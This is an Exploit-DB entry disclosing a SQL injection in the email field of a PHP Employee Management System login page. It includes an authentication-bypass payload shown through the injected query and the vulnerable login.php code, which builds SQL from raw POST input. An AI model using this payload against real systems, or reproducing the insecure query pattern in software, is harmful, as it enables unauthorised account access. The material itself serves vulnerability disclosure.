{"source": "https://www.exploit-db.com/exploits/51803", "vulnName": "Employee Management System v1 - 'email' SQL Injection", "vulnEDBID": "51803", "vulnCVE": "N/A", "author": "SOSPIRO", "exploitType": "WEBAPPS", "platform": "PHP", "datePublished": "2024-02-19", "vulnContent": "# Exploit Title: Employee Management System v1 - 'email' SQL Injection\n# Google Dork: N/A\n# Application: Employee Management System \n# Date: 19.02.2024\n# Bugs: SQL Injection \n# Exploit Author: SoSPiro\n# Vendor Homepage: https://www.sourcecodester.com/\n# Software Link: https://www.sourcecodester.com/php/16999/employee-management-system.html\n# Version: N/A\n# Tested on: Windows 10 64 bit Wampserver \n# CVE : N/A\n\n\n## Vulnerability Description:\n\nIn your code, there is a potential SQL injection vulnerability due to directly incorporating user-provided data into the SQL query used for user login. This situation increases the risk of SQL injection attacks where malicious users may input inappropriate data to potentially harm your database or steal sensitive information.\n\n\n## Proof of Concept (PoC):\n\nAn example attacker could input the following into the email field instead of a valid email address:\n\nIn this case, the SQL query would look like:\n\nSELECT * FROM users WHERE email='' OR '1'='1' --' AND password = '' AND status = 'Active'\nAs \"1=1\" is always true, the query would return positive results, allowing the attacker to log in.\n\n\n## Vulnerable code section:\n====================================================\nemployee/Admin/login.php\n\n<?php\nsession_start();\nerror_reporting(1);\ninclude('../connect.php');\n\n//Get website details\n$sql_website = \"select * from website_setting\"; \n$result_website = $conn->query($sql_website);\n$row_website = mysqli_fetch_array($result_website);\n\n\nif(isset($_POST['btnlogin'])){\n\n\n//Get Date\ndate_default_timezone_set('Africa/Lagos');\n$current_date = date('Y-m-d h:i:s');\n\n\n$email = $_POST['txtemail'];\n$password = $_POST['txtpassword'];\n$status = 'Active';\n\n\n $sql = \"SELECT * FROM users WHERE email='\" .$email. \"' and password = '\".$password.\"'  and status = '\".$status.\"'\";\n  $result = mysqli_query($conn, $sql);\n\nif (mysqli_num_rows($result) > 0) {\n  // output data of each row\n ($row = mysqli_fetch_assoc($result));\n  $_SESSION[\"email\"] = $row['email'];\n   $_SESSION[\"password\"] = $row['password'];\n $_SESSION[\"phone\"] = $row['phone'];\n   $firstname = $row['firstname'];\n    $_SESSION[\"firstname\"] = $row['firstname'];\n\n   $fa = $row['2FA'];\n\n }\n            "}